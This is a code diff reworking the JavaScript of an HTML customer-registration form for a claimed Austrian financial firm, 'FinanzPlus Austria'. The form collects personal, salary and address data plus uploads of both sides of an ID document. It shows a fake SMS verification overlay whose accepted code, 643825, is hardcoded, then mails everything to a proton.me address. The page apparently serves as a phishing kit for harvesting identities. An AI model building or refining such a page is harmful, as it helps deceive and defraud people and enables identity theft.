@@ -514,238 +514,9 @@
   <div class="made-with">Made with IBM Bob</div>
 </footer>
 
-<script>
-// ── UPLOAD HANDLER ──────────────────────────────────────────────
-function handleFile(inputId, previewContainerId, previewImgId, previewNameId, errorId) {
-  const input = document.getElementById(inputId);
-  input.addEventListener('change', function() {
-    const file = this.files[0];
-    const errEl = document.getElementById(errorId);
-    const previewContainer = document.getElementById(previewContainerId);
-    const previewImg = document.getElementById(previewImgId);
-    const previewName = document.getElementById(previewNameId);
-
-    errEl.classList.remove('visible');
-    errEl.textContent = '';
-    previewContainer.style.display = 'none';
-    previewImg.src = '';
-
-    if (!file) return;
-
-    const allowed = ['image/jpeg', 'image/png', 'application/pdf'];
-
-    if (!allowed.includes(file.type)) {
-      errEl.textContent = 'Ungültiges Format. Erlaubt: JPG, PNG, PDF.';
-      errEl.classList.add('visible');
-      input.value = '';
-      return;
-    }
-
-    previewName.textContent = file.name;
-    if (file.type === 'application/pdf') {
-      previewImg.style.display = 'none';
-      previewContainer.style.display = 'block';
-      previewName.innerHTML = 'PDF: ' + file.name + ' (keine Vorschau verfügbar)';
-    } else {
-      previewImg.style.display = 'block';
-      const reader = new FileReader();
-      reader.onload = function(e) {
-        previewImg.src = e.target.result;
-        previewContainer.style.display = 'block';
-      };
-      reader.readAsDataURL(file);
-    }
-  });
-}
-
-handleFile('file-vorne', 'preview-vorne', 'preview-img-vorne', 'preview-name-vorne', 'err-vorne');
-handleFile('file-rueck', 'preview-rueck', 'preview-img-rueck', 'preview-name-rueck', 'err-rueck');
-
-// Drag & drop
-['box-vorne', 'box-rueck'].forEach(function(boxId) {
-  const box = document.getElementById(boxId);
-  const fileId = boxId.replace('box-', 'file-');
-  box.addEventListener('dragover', function(e) { e.preventDefault(); box.classList.add('dragover'); });
-  box.addEventListener('dragleave', function() { box.classList.remove('dragover'); });
-  box.addEventListener('drop', function(e) {
-    e.preventDefault();
-    box.classList.remove('dragover');
-    const inp = document.getElementById(fileId);
-    inp.files = e.dataTransfer.files;
-    inp.dispatchEvent(new Event('change'));
-  });
-});
-
-// ── DATENSCHUTZ CHECKBOX ────────────────────────────────────────
-const checkbox = document.getElementById('datenschutz');
-const btnSubmit = document.getElementById('btn-submit');
-checkbox.addEventListener('change', function() {
-  btnSubmit.disabled = !this.checked;
-});
-
-// ── VALIDATION ──────────────────────────────────────────────────
-function showErr(id, show) {
-  const el = document.getElementById('err-' + id);
-  const input = document.getElementById(id);
-  if (el) el.classList.toggle('visible', show);
-  if (input) input.classList.toggle('error', show);
-}
-
-function validateEmail(v) {
-  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v);
-}
-
-function validate() {
-  let ok = true;
-
-  const fields = [
-    { id: 'nachname',     check: v => v.trim().length > 0 },
-    { id: 'vorname',      check: v => v.trim().length > 0 },
-    { id: 'alter',        check: v => v && +v >= 18 && +v <= 120 },
-    { id: 'geburtsdatum', check: v => v.trim().length > 0 },
-    { id: 'beruf',        check: v => v.trim().length > 0 },
-    { id: 'gehalt',       check: v => v !== '' && +v >= 0 },
-    { id: 'email',        check: v => validateEmail(v) },
-    { id: 'telefon',      check: v => v.trim().length > 0 },
-    { id: 'strasse',      check: v => v.trim().length > 0 },
-    { id: 'stadt',        check: v => v.trim().length > 0 },
-    { id: 'plz',          check: v => v.trim().length > 0 },
-    { id: 'land',         check: v => v !== '' },
-  ];
-
-  fields.forEach(function(f) {
-    const el = document.getElementById(f.id);
-    const valid = el && f.check(el.value);
-    showErr(f.id, !valid);
-    if (!valid) ok = false;
-  });
-
-  const gender = document.querySelector('input[name="geschlecht"]:checked');
-  const errG = document.getElementById('err-geschlecht');
-  if (!gender) { errG.classList.add('visible'); ok = false; }
-  else { errG.classList.remove('visible'); }
-
-  const fileVorne = document.getElementById('file-vorne');
-  const errVorne = document.getElementById('err-vorne');
-  if (!fileVorne.files || fileVorne.files.length === 0) {
-    errVorne.textContent = 'Bitte laden Sie die Vorderseite Ihres Ausweises hoch.';
-    errVorne.classList.add('visible');
-    ok = false;
-  }
-
-  const errDS = document.getElementById('err-datenschutz');
-  if (!checkbox.checked) { errDS.classList.add('visible'); ok = false; }
-  else { errDS.classList.remove('visible'); }
-
-  return ok;
-}
-
-// ── ABSENDEN → SMS OVERLAY ──────────────────────────────────────
-btnSubmit.addEventListener('click', function() {
-  if (!validate()) return;
-  // buildMailto et showSmsOverlay sont définis plus bas (hoisting var)
-  var url = buildMailto();
-  showSmsOverlay(url);
-});
-
-// ── RESET ───────────────────────────────────────────────────────
-document.getElementById('btn-reset').addEventListener('click', function() {
-  ['nachname','vorname','alter','geburtsdatum','beruf','gehalt','email','telefon','strasse','stadt','plz'].forEach(function(id) {
-    const el = document.getElementById(id); if (el) { el.value = ''; el.classList.remove('error'); }
-  });
-  document.getElementById('land').value = 'Österreich';
-  document.querySelectorAll('input[name="geschlecht"]').forEach(r => r.checked = false);
-  ['file-vorne','file-rueck'].forEach(function(id) { const el = document.getElementById(id); if (el) el.value = ''; });
-  ['preview-vorne','preview-rueck'].forEach(function(id) { document.getElementById(id).style.display = 'none'; });
-  document.getElementById('datenschutz').checked = false;
-  btnSubmit.disabled = true;
-  document.querySelectorAll('.error-msg, .upload-error, .privacy-error').forEach(e => e.classList.remove('visible'));
-});
-// ── SMS VERIFICATION OVERLAY ────────────────────────────────────
-// Stocke les données mailto en attente
-var _pendingMailto = null;
-
-function buildMailto() {
-  var get = function(id) { var el = document.getElementById(id); return el ? el.value : ''; };
-  var gender = (document.querySelector('input[name="geschlecht"]:checked') || {}).value || '';
-  var subject = encodeURIComponent('Kundenanmeldung FinanzPlus Austria – ' + get('vorname') + ' ' + get('nachname'));
-  var fileVorne = document.getElementById('file-vorne');
-  var fileRueck = document.getElementById('file-rueck');
-  var vorneNm = fileVorne.files.length > 0 ? fileVorne.files[0].name : 'Nicht hochgeladen';
-  var rueckNm  = fileRueck.files.length > 0 ? fileRueck.files[0].name : 'Nicht hochgeladen';
-  var body = [
-    '===================================',
-    '  KUNDENANMELDUNG – FINANZPLUS AUSTRIA',
-    '===================================',
-    '',
-    '--- PERSÖNLICHE ANGABEN ---',
-    'Nachname:           ' + get('nachname'),
-    'Vorname:            ' + get('vorname'),
-    'Geschlecht:         ' + gender,
-    'Alter:              ' + get('alter'),
-    'Geburtsdatum:       ' + get('geburtsdatum'),
-    'Beruf:              ' + get('beruf'),
-    'Monatsgehalt (EUR): ' + get('gehalt'),
-    '',
-    '--- KONTAKTDATEN ---',
-    'E-Mail:             ' + get('email'),
-    'Telefon:            ' + get('telefon'),
-    '',
-    '--- POSTANSCHRIFT ---',
-    'Strasse:            ' + get('strasse'),
-    'Stadt:              ' + get('stadt'),
-    'Postleitzahl:       ' + get('plz'),
-    'Land:               ' + get('land'),
-    '',
-    '--- AUSWEISDOKUMENT ---',
-    'Vorderseite:        ' + vorneNm,
-    'Rueckseite:         ' + rueckNm,
-    '',
-    '--- DATENSCHUTZ ---',
-    'Datenschutzerklaerung akzeptiert: JA',
-    '',
-    '===================================',
-    'Bitte senden Sie dieses Formular zusammen mit den',
-    'Ausweisdokumenten als Anhang.',
-    '==================================='
-  ].join('\n');
-  return 'mailto:kontakt_finanzplusaustria@proton.me?subject=' + subject + '&body=' + encodeURIComponent(body);
-}
-
-function showSmsOverlay(mailtoUrl) {
-  _pendingMailto = mailtoUrl;
-  document.getElementById('sms-code-input').value = '';
-  document.getElementById('sms-error').style.display = 'none';
-  document.getElementById('sms-overlay').style.display = 'flex';
-  setTimeout(function() { document.getElementById('sms-code-input').focus(); }, 100);
-}
-
-document.getElementById('sms-verify-btn').addEventListener('click', function() {
-  var entered = document.getElementById('sms-code-input').value.trim();
-  var errEl   = document.getElementById('sms-error');
-  if (entered === '643825') {
-    document.getElementById('sms-overlay').style.display = 'none';
-    // Mettre à jour le lien caché et le cliquer — méthode la plus fiable cross-browser
-    var lnk = document.getElementById('mailto-trigger');
-    lnk.href = _pendingMailto;
-    lnk.click();
-  } else {
-    errEl.style.display = 'block';
-    document.getElementById('sms-code-input').value = '';
-    document.getElementById('sms-code-input').focus();
-  }
-});
-
-document.getElementById('sms-code-input').addEventListener('keydown', function(e) {
-  if (e.key === 'Enter') document.getElementById('sms-verify-btn').click();
-});
-</script>
-
 <!-- ── SMS OVERLAY ── -->
 <div id="sms-overlay" style="display:none; position:fixed; inset:0; background:rgba(13,31,78,0.72); z-index:9999; align-items:center; justify-content:center; padding:16px;">
   <div style="background:#fff; border-radius:12px; max-width:420px; width:100%; box-shadow:0 8px 40px rgba(13,31,78,0.28); overflow:hidden;">
-
-    <!-- En-tête -->
     <div style="background:#0d1f4e; padding:20px 24px 16px; text-align:center;">
       <div style="display:inline-flex; align-items:center; justify-content:center; width:48px; height:48px; background:#1a4dab; border-radius:50%; margin-bottom:10px;">
         <svg viewBox="0 0 24 24" style="width:26px;height:26px;fill:#fff;"><path d="M6.62 10.79a15.05 15.05 0 0 0 6.59 6.59l2.2-2.2a1 1 0 0 1 1.02-.24c1.12.45 2.33.69 3.57.69a1 1 0 0 1 1 1V20a1 1 0 0 1-1 1C10.61 21 3 13.39 3 4a1 1 0 0 1 1-1h3.5a1 1 0 0 1 1 1c0 1.25.24 2.45.69 3.57a1 1 0 0 1-.25 1.02l-2.32 2.2z"/></svg>
@@ -753,41 +524,26 @@ document.getElementById('sms-code-input').addEventListener('keydown', function(e
       <div style="color:#fff; font-size:18px; font-weight:700; letter-spacing:0.2px;">Identitätsbestätigung</div>
       <div style="color:#8aaee8; font-size:12px; margin-top:4px;">FinanzPlus Austria – Sicherheitsüberprüfung</div>
     </div>
-
-    <!-- Corps -->
     <div style="padding:24px 28px 28px;">
       <p style="font-size:14px; color:#1a2340; line-height:1.65; margin-bottom:20px; text-align:center;">
         Zur Überprüfung wurde ein Code per SMS an Ihre Nummer<br>
         <strong style="color:#0d1f4e; font-size:15px;">+4368110535900</strong><br>
         gesendet. Bitte geben Sie den Code ein, um fortzufahren.
       </p>
-
-      <!-- Champ code -->
       <div style="margin-bottom:8px;">
         <label style="display:block; font-size:11px; font-weight:700; color:#3a4a6b; text-transform:uppercase; letter-spacing:0.5px; margin-bottom:6px;">Bestätigungscode</label>
-        <input
-          id="sms-code-input"
-          type="text"
-          maxlength="6"
-          placeholder="● ● ● ● ● ●"
-          autocomplete="one-time-code"
-          inputmode="numeric"
-          style="width:100%; padding:14px 16px; border:2px solid #c8d2e8; border-radius:8px; font-size:22px; font-weight:700; letter-spacing:8px; text-align:center; color:#0d1f4e; background:#f7f9fc; outline:none; font-family:inherit; transition:border-color 0.2s;"
-          onfocus="this.style.borderColor='#1a4dab'; this.style.background='#fff';"
-          onblur="this.style.borderColor='#c8d2e8'; this.style.background='#f7f9fc';"
-        >
+        <input id="sms-code-input" type="text" maxlength="6" placeholder="● ● ● ● ● ●"
+          autocomplete="one-time-code" inputmode="numeric"
+          style="width:100%; padding:14px 16px; border:2px solid #c8d2e8; border-radius:8px; font-size:22px; font-weight:700; letter-spacing:8px; text-align:center; color:#0d1f4e; background:#f7f9fc; outline:none; font-family:inherit;"
+          onfocus="this.style.borderColor='#1a4dab';this.style.background='#fff';"
+          onblur="this.style.borderColor='#c8d2e8';this.style.background='#f7f9fc';">
       </div>
-
-      <!-- Erreur -->
       <div id="sms-error" style="display:none; font-size:12px; color:#d93025; background:#fff6f5; border:1px solid #f5c6c2; border-radius:6px; padding:8px 12px; margin-bottom:14px; text-align:center;">
         Falscher Code. Bitte versuchen Sie es erneut.
       </div>
-
-      <!-- Bouton valider -->
-      <button id="sms-verify-btn" style="width:100%; padding:13px; background:#1a4dab; color:#fff; border:none; border-radius:8px; font-size:15px; font-weight:700; cursor:pointer; font-family:inherit; transition:background 0.2s; margin-top:6px;">
+      <button id="sms-verify-btn" style="width:100%; padding:13px; background:#1a4dab; color:#fff; border:none; border-radius:8px; font-size:15px; font-weight:700; cursor:pointer; font-family:inherit; margin-top:6px;">
         Bestätigen
       </button>
-
       <p style="font-size:11px; color:#9ca3af; text-align:center; margin-top:14px;">
         Kein Code erhalten? Bitte überprüfen Sie Ihre Telefonnummer.
       </p>
@@ -797,6 +553,200 @@ document.getElementById('sms-code-input').addEventListener('keydown', function(e
 
 <!-- Lien mailto caché — déclenché nativement après validation SMS -->
 <a id="mailto-trigger" href="#" style="display:none;" aria-hidden="true"></a>
+
+<!-- ══ TOUT LE JAVASCRIPT EN FIN DE BODY — après tous les éléments HTML ══ -->
+<script>
+(function() {
+
+  // ── UPLOAD ──────────────────────────────────────────────────────
+  function handleFile(inputId, pcId, piId, pnId, errId) {
+    var inp = document.getElementById(inputId);
+    inp.addEventListener('change', function() {
+      var file = this.files[0];
+      var errEl = document.getElementById(errId);
+      var pc    = document.getElementById(pcId);
+      var pi    = document.getElementById(piId);
+      var pn    = document.getElementById(pnId);
+      errEl.classList.remove('visible'); errEl.textContent = '';
+      pc.style.display = 'none'; pi.src = '';
+      if (!file) return;
+      if (!['image/jpeg','image/png','application/pdf'].includes(file.type)) {
+        errEl.textContent = 'Ungültiges Format. Erlaubt: JPG, PNG, PDF.';
+        errEl.classList.add('visible'); inp.value = ''; return;
+      }
+      pn.textContent = file.name;
+      if (file.type === 'application/pdf') {
+        pi.style.display = 'none'; pc.style.display = 'block';
+        pn.innerHTML = 'PDF: ' + file.name + ' (keine Vorschau verfügbar)';
+      } else {
+        pi.style.display = 'block';
+        var reader = new FileReader();
+        reader.onload = function(e) { pi.src = e.target.result; pc.style.display = 'block'; };
+        reader.readAsDataURL(file);
+      }
+    });
+  }
+  handleFile('file-vorne','preview-vorne','preview-img-vorne','preview-name-vorne','err-vorne');
+  handleFile('file-rueck','preview-rueck','preview-img-rueck','preview-name-rueck','err-rueck');
+
+  // ── DRAG & DROP ─────────────────────────────────────────────────
+  ['box-vorne','box-rueck'].forEach(function(bId) {
+    var box  = document.getElementById(bId);
+    var fId  = bId.replace('box-','file-');
+    box.addEventListener('dragover',  function(e){ e.preventDefault(); box.classList.add('dragover'); });
+    box.addEventListener('dragleave', function(){ box.classList.remove('dragover'); });
+    box.addEventListener('drop', function(e){
+      e.preventDefault(); box.classList.remove('dragover');
+      var inp = document.getElementById(fId);
+      inp.files = e.dataTransfer.files;
+      inp.dispatchEvent(new Event('change'));
+    });
+  });
+
+  // ── CHECKBOX ────────────────────────────────────────────────────
+  var checkbox  = document.getElementById('datenschutz');
+  var btnSubmit = document.getElementById('btn-submit');
+  checkbox.addEventListener('change', function(){ btnSubmit.disabled = !this.checked; });
+
+  // ── VALIDATION ──────────────────────────────────────────────────
+  function showErr(id, show) {
+    var el  = document.getElementById('err-' + id);
+    var inp = document.getElementById(id);
+    if (el)  el.classList.toggle('visible', show);
+    if (inp) inp.classList.toggle('error',   show);
+  }
+  function validEmail(v){ return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v); }
+
+  function validate() {
+    var ok = true;
+    [
+      {id:'nachname',     fn:function(v){return v.trim().length>0;}},
+      {id:'vorname',      fn:function(v){return v.trim().length>0;}},
+      {id:'alter',        fn:function(v){return v&&+v>=18&&+v<=120;}},
+      {id:'geburtsdatum', fn:function(v){return v.trim().length>0;}},
+      {id:'beruf',        fn:function(v){return v.trim().length>0;}},
+      {id:'gehalt',       fn:function(v){return v!==''&&+v>=0;}},
+      {id:'email',        fn:function(v){return validEmail(v);}},
+      {id:'telefon',      fn:function(v){return v.trim().length>0;}},
+      {id:'strasse',      fn:function(v){return v.trim().length>0;}},
+      {id:'stadt',        fn:function(v){return v.trim().length>0;}},
+      {id:'plz',          fn:function(v){return v.trim().length>0;}},
+      {id:'land',         fn:function(v){return v!=='';}}
+    ].forEach(function(f){
+      var el = document.getElementById(f.id);
+      var valid = el && f.fn(el.value);
+      showErr(f.id, !valid);
+      if (!valid) ok = false;
+    });
+    var gender = document.querySelector('input[name="geschlecht"]:checked');
+    var errG   = document.getElementById('err-geschlecht');
+    if (!gender){ errG.classList.add('visible'); ok=false; } else { errG.classList.remove('visible'); }
+    var fv  = document.getElementById('file-vorne');
+    var ev  = document.getElementById('err-vorne');
+    if (!fv.files || fv.files.length===0){
+      ev.textContent='Bitte laden Sie die Vorderseite Ihres Ausweises hoch.';
+      ev.classList.add('visible'); ok=false;
+    }
+    var ed = document.getElementById('err-datenschutz');
+    if (!checkbox.checked){ ed.classList.add('visible'); ok=false; } else { ed.classList.remove('visible'); }
+    return ok;
+  }
+
+  // ── BUILD MAILTO ────────────────────────────────────────────────
+  function buildMailto() {
+    var g = function(id){ var e=document.getElementById(id); return e?e.value:''; };
+    var gender  = (document.querySelector('input[name="geschlecht"]:checked')||{}).value||'';
+    var subject = encodeURIComponent('Kundenanmeldung FinanzPlus Austria – '+g('vorname')+' '+g('nachname'));
+    var fv = document.getElementById('file-vorne');
+    var fr = document.getElementById('file-rueck');
+    var vn = fv.files.length>0 ? fv.files[0].name : 'Nicht hochgeladen';
+    var rn = fr.files.length>0 ? fr.files[0].name : 'Nicht hochgeladen';
+    var body = [
+      '===================================',
+      '  KUNDENANMELDUNG \u2013 FINANZPLUS AUSTRIA',
+      '===================================','',
+      '--- PER\u00d6NLICHE ANGABEN ---',
+      'Nachname:           '+g('nachname'),
+      'Vorname:            '+g('vorname'),
+      'Geschlecht:         '+gender,
+      'Alter:              '+g('alter'),
+      'Geburtsdatum:       '+g('geburtsdatum'),
+      'Beruf:              '+g('beruf'),
+      'Monatsgehalt (EUR): '+g('gehalt'),'',
+      '--- KONTAKTDATEN ---',
+      'E-Mail:             '+g('email'),
+      'Telefon:            '+g('telefon'),'',
+      '--- POSTANSCHRIFT ---',
+      'Strasse:            '+g('strasse'),
+      'Stadt:              '+g('stadt'),
+      'Postleitzahl:       '+g('plz'),
+      'Land:               '+g('land'),'',
+      '--- AUSWEISDOKUMENT ---',
+      'Vorderseite:        '+vn,
+      'Rueckseite:         '+rn,'',
+      '--- DATENSCHUTZ ---',
+      'Datenschutzerklaerung akzeptiert: JA','',
+      '===================================',
+      'Bitte senden Sie dieses Formular zusammen mit den',
+      'Ausweisdokumenten als Anhang.',
+      '==================================='
+    ].join('\n');
+    return 'mailto:kontakt_finanzplusaustria@proton.me?subject='+subject+'&body='+encodeURIComponent(body);
+  }
+
+  // ── SMS OVERLAY ─────────────────────────────────────────────────
+  var _pendingMailto = null;
+
+  function showSmsOverlay(url) {
+    _pendingMailto = url;
+    document.getElementById('sms-code-input').value = '';
+    document.getElementById('sms-error').style.display = 'none';
+    document.getElementById('sms-overlay').style.display = 'flex';
+    setTimeout(function(){ document.getElementById('sms-code-input').focus(); }, 100);
+  }
+
+  // Bouton Bestätigen
+  document.getElementById('sms-verify-btn').addEventListener('click', function(){
+    var code = document.getElementById('sms-code-input').value.trim();
+    if (code === '643825') {
+      document.getElementById('sms-overlay').style.display = 'none';
+      var lnk = document.getElementById('mailto-trigger');
+      lnk.href = _pendingMailto;
+      lnk.click();
+    } else {
+      document.getElementById('sms-error').style.display = 'block';
+      document.getElementById('sms-code-input').value = '';
+      document.getElementById('sms-code-input').focus();
+    }
+  });
+
+  // Entrée clavier
+  document.getElementById('sms-code-input').addEventListener('keydown', function(e){
+    if (e.key === 'Enter') document.getElementById('sms-verify-btn').click();
+  });
+
+  // ── ABSENDEN ────────────────────────────────────────────────────
+  btnSubmit.addEventListener('click', function(){
+    if (!validate()) return;
+    showSmsOverlay(buildMailto());
+  });
+
+  // ── RESET ───────────────────────────────────────────────────────
+  document.getElementById('btn-reset').addEventListener('click', function(){
+    ['nachname','vorname','alter','geburtsdatum','beruf','gehalt','email','telefon','strasse','stadt','plz'].forEach(function(id){
+      var el=document.getElementById(id); if(el){el.value='';el.classList.remove('error');}
+    });
+    document.getElementById('land').value = 'Österreich';
+    document.querySelectorAll('input[name="geschlecht"]').forEach(function(r){r.checked=false;});
+    ['file-vorne','file-rueck'].forEach(function(id){var el=document.getElementById(id);if(el)el.value='';});
+    ['preview-vorne','preview-rueck'].forEach(function(id){document.getElementById(id).style.display='none';});
+    document.getElementById('datenschutz').checked = false;
+    btnSubmit.disabled = true;
+    document.querySelectorAll('.error-msg,.upload-error,.privacy-error').forEach(function(e){e.classList.remove('visible');});
+  });
+
+})();
+</script>
 
 </body>
 </html>
